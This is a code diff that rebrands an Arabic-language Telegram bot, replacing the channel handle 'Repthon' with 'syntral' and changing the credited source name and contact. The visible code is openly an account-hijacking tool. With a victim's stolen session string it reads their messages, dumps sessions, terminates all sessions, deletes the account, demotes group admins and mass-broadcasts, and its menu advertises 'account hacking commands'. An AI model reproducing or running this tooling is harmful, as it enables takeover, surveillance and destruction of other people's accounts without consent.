@@ -186,7 +186,7 @@ M  ➠  ** تغييـر رقـم هـاتف الحسـاب **
 
 '''
 mm = '''
-**- عليك الانضمـام في قنـاة السـورس اولاً**  @Repthon
+**- عليك الانضمـام في قنـاة السـورس اولاً**  @syntral
 '''
 
 keyboard = [
@@ -211,7 +211,7 @@ keyboard = [
     Button.inline("N", data="NNN"),
     ],
   [
-    Button.url("𝗥𝗲𝗽𝘁𝗵𝗼𝗻™ 𓅛", "https://t.me/Repthon")
+    Button.url("syntral™ 𓅛", "https://t.me/syntral")
     ]
 ]
 
@@ -254,7 +254,7 @@ async def start(event):
             Button.inline("N", data="NNN"),
             ],
           [
-            Button.url("𝗥𝗲𝗽𝘁𝗵𝗼𝗻™ 𓅛", "https://t.me/Repthon")
+            Button.url("syntral™ 𓅛", "https://t.me/syntral")
             ]
         ]
         await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)
@@ -275,7 +275,7 @@ async def users(event):
         return await event.reply("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\n**- بواسطـة ريبـــثون @Repthon**")
+        file.write(i + "\n\n**- بواسطـة ريبـــثون @syntral**")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -321,7 +321,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ريبـــثون ❤️**", buttons=keyboard)
+      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس السيد ❤️**", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"EEE")))
 async def users(event):
@@ -395,7 +395,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- شكـراً لـ استخدامـك ســورس ريبـــثون**", buttons=keyboard)
+      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- شكـراً لـ استخدامـك ســورس السيد**", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"JJJ")))
 async def users(event):
@@ -408,7 +408,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("**- تم حـذف الحسـاب .. بنجـاح \n- شكـراً لـ استخدامـك ســورس زدثــون**", buttons=keyboard)
+      await event.reply("**- تم حـذف الحسـاب .. بنجـاح \n- شكـراً لـ استخدامـك ســورس السيد**", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"KKK")))
 async def users(event):
@@ -443,7 +443,7 @@ async def users(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس ريبـــثون**", buttons=keyboard)
+      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس السيد**", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"MMM")))
 async def users(event):
@@ -471,7 +471,7 @@ async def users(event):
         else:
           await event.respond("**هناك شي خطا**")
       except Exception as e:
-        await event.respond(f"**- ارسل هذا الخطأ الى @E_7_V \n- الخطـأ** str(e)\n")
+        await event.respond(f"**- ارسل هذا الخطأ الى @S_i_D \n- الخطـأ** str(e)\n")
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"NNN")))
 async def start(event):
@@ -482,7 +482,7 @@ async def start(event):
         Button.inline("c", data="ccc"),
         ],
       [
-        Button.url("قنـاة السـورس", "https://t.me/Repthon")
+        Button.url("قنـاة السـورس", "https://t.me/syntral")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
